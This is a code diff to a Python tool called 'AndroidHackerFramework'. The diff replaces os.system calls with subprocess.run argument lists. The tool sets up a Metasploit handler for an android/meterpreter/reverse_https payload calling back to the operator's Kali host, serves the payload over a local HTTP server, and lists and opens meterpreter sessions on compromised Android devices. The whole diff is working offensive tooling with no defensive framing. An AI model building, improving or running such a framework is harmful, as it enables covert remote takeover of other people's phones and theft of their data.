@@ -52,7 +52,10 @@ class AndroidHackerFramework:
     
     def clear_screen(self):
         """Clear terminal screen"""
-        os.system('clear' if platform.system() != 'Windows' else 'cls')
+        if platform.system() != 'Windows':
+            subprocess.run(["clear"])
+        else:
+            subprocess.run(["cls"], shell=True)
     
     def print_banner(self):
         """Print professional hacker banner"""
@@ -116,15 +119,16 @@ class AndroidHackerFramework:
         """Start Metasploit listener"""
         print(f"\n{Fore.YELLOW}[+] Starting Metasploit listener...{Fore.WHITE}\n")
         
-        cmd = f"""msfconsole -q -x """
-        cmd += f""""use exploit/multi/handler; """
-        cmd += f"""set payload android/meterpreter/reverse_https; """
-        cmd += f"""set LHOST {self.kali_ip}; """
-        cmd += f"""set LPORT {self.port}; """
-        cmd += f"""set ExitOnSession false; """
-        cmd += f"""exploit -j -z\""""
-        
-        os.system(cmd)
+        msf_cmd = (
+            "use exploit/multi/handler; "
+            "set payload android/meterpreter/reverse_https; "
+            f"set LHOST {self.kali_ip}; "
+            f"set LPORT {self.port}; "
+            "set ExitOnSession false; "
+            "exploit -j -z"
+        )
+        cmd = ["msfconsole", "-q", "-x", msf_cmd]
+        subprocess.run(cmd)
         
     def start_http_server(self):
         """Start HTTP server"""
@@ -138,7 +142,7 @@ class AndroidHackerFramework:
             print(f"{Fore.RED}[-] Payload not found. Generate it first (Option 1){Fore.WHITE}")
             return
         
-        os.system(f"python3 -m http.server 8000")
+        subprocess.run([sys.executable, "-m", "http.server", "8000"])
         
     def check_sessions(self):
         """Check active meterpreter sessions"""
@@ -161,8 +165,8 @@ class AndroidHackerFramework:
         """
         
         # Simple command to check
-        cmd = "msfconsole -q -x 'sessions -l; exit'"
-        os.system(cmd)
+        cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
+        subprocess.run(cmd)
         
     def interactive_session(self):
         """Connect to interactive session"""
@@ -175,8 +179,8 @@ class AndroidHackerFramework:
             session_id = input(f"\n{Fore.GREEN}[?] Enter session ID: {Fore.WHITE}")
         
         if session_id:
-            cmd = f"msfconsole -q -x 'sessions -i {session_id}'"
-            os.system(cmd)
+            cmd = ["msfconsole", "-q", "-x", f"sessions -i {session_id}"]
+            subprocess.run(cmd)
         else:
             print(f"{Fore.RED}[-] No session ID provided{Fore.WHITE}")
             
